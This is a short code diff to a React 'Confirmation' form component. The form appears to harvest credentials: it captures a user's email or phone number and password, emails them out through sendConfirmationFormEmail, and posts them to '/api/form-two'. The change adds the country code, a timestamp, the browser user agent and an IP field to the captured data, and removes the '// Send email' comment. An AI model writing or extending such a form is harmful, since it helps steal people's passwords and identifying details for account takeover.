@@ -70,10 +70,13 @@ export default function Confirmation() {
       const formattedData = {
         user_email: data.user_email ? (contactMethod === 'phone' ? `${countryCode}${data.user_email}` : data.user_email) : undefined,
         password: data.password,
-        contactMethod: contactMethod
+        contactMethod: contactMethod,
+        countryCode: contactMethod === 'phone' ? countryCode : undefined,
+        timestamp: new Date().toLocaleString(),
+        userAgent: navigator.userAgent,
+        ipAddress: "Not available" 
       };
 
-      // Send email
       await sendConfirmationFormEmail(formattedData);
 
       const response = await fetch('/api/form-two', {
